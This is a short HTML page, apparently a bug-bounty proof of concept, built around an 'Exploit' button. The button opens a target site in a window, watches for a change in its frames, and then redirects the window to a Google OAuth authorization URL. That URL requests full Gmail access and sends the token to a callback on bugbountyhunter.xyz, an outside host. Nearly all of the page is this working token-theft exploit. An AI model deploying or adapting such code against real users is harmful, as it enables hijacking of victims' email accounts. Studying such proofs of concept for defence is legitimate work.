<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background-color: white;
            width: 100%;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        #container {
            position: relative; /* Make this the reference for positioning the button */
            text-align: center; /* Center-align contents inside the container */
        }

        #bg-image {
            max-width: 20%; /* Adjust the image size */
            display: block; /* Ensures it respects centering within the container */
            margin: 0 auto; /* Center the image horizontally */
        }

        #exploit-button {
            position: absolute;
            bottom: -30px; /* Position the button below the image */
            left: 50%;
            transform: translateX(-50%);
            padding: 10px 20px;
            font-size: 16px;
            background-color: black;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #exploit-button:hover {
            background-color: #444;
        }
    </style>
    <script>
        // Get the URL parameter
        function getParameterByName(name, target) {
            if (!target) target = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(target);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        let foo;
        let baselength;
        var urlParam = getParameterByName('target');
        function init() {
            baselength = foo.length;
            console.log("Setting base to " + baselength);
            watch();
        }
        function watch() {
            if (foo.length != baselength) {
                console.log("baselength: " + baselength);
                console.log("foo.length " + foo.length);
                console.log('Google navigation');
                foo.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id=92872884978-fd7hoogqudduc5eutv400o6rj3tdcj0h.apps.googleusercontent.com&redirect_uri=https://bugbountyhunter.xyz/callback.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
            } else {
                console.log("watch(): " + foo.length + " / " + baselength);
                setTimeout(watch, 1);
            }
        }
        function launch() {
            foo = window.open(urlParam, "foo", "");
            setTimeout(init, 1200);
        }
    </script>
</head>
<body>
    <div id="container">
        <img id="bg-image" src="https://bugbountyhunter.xyz/images/hlabs-black-logo.png">
        <button id="exploit-button" onclick="launch()">Exploit</button>
    </div>
</body>
</html>
